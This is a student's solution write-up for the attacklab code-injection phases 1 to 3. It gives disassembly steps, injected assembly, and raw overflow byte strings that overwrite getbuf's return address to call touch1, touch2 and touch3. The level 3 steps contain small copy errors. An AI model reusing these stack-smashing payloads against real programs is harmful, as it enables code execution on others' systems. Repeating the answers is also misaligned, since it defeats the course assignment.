This file contains materials for one instance of the attacklab.

Files:

    ctarget

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

     cookie.txt

Text file containing 4-byte signature required for this lab instance.

     farm.c

Source code for gadget farm present in this instance of rtarget.  You
can compile (use flag -Og) and disassemble it to look for gadgets.

     hex2raw

Utility program to generate byte sequences.  See documentation in lab
handout.  
<br>
# Part I: Code Injection Attacks
```bash
objdump -d ctarget >> c
```
## Level 1
The address of touch1 is `4017c0`.  
In getbuf, `sub $0x28,%rsp` gives us 40 bytes space.  
So, the attack bytes: [phase1.txt](phase1.txt)
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```  
```bash
cat phase1.txt |./hex2raw |./ctarget -q
```
## Level 2
1. move cookie to %rdi
2. move touch2 address to %rsp  

So the assembly code: [phase2.s](phase2.s)
```assembly
movq $0x59b997fa,%rdi
pushq $0x4017ec
ret
```
```bash
gcc -c phase2.s
objdump -d phase2.o > phase2.d
```
So, the attack bytes: [phase2.txt](phase2.txt)
```
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```
## Level 3
1. Change cookie string to bytes
2. Store bytes in somewhere and move it to %rdi
3. move touch3 address to %rsp

| char | hex |
|:----:|:---:|
|  5   | 35  |
|  9   | 39  |
|  b   | 62  |
|  9   | 39  |
|  9   | 39  |
|  7   | 37  |
|  f   | 66  |
|  a   | 61  |

So the assembly code: [phase3.s](phase3.s)
```assembly
movq %rsp,%rdi
pushq $0x4018fa
ret
```
```bash
gcc -c phase2.s
objdump -d phase3.o > phase3.d
```
So, the attack bytes: [phase3.txt](phase3.txt)
```
48 89 e7 68 fa 18 40 00
c3 00 00 00 00 00 00 00
fa 18 40 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00  <- %rsp when finished getbuf()
```
